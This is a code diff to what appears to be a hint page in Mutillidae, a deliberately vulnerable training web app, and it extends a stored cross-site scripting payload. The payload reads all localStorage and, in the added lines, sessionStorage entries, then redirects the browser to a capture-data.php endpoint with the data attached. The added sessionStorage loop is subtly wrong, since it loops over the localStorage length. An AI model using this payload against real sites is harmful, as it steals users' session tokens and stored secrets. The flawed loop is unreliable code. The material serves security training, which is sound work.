@@ -329,8 +329,11 @@
 			NOTE: This version &quot;MySQL escapes&quot; the &quot;\n&quot; new-line character by doubling up the &quot;\&quot; character because &quot;\n&quot; means new-line in MySQL and this is going to be inserted into the database.
 			<br />
 <code>
-&lt;script&gt;try{var m = &quot;&quot;;var l = window.localStorage;for(i=0;i&lt;l.length;i++){
+&lt;script&gt;try{var m = &quot;&quot;;
+var l = window.localStorage;for(i=0;i&lt;l.length;i++){
 var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\\n&quot;;};
+var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){
+var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\\n&quot;;};
 document.location=&quot;http://localhost/mutillidae/capture-data.php?html5storage=&quot; + m;}catch(e){alert(e.message);}&lt;/script&gt;
 </code>
 			<br/><br/>
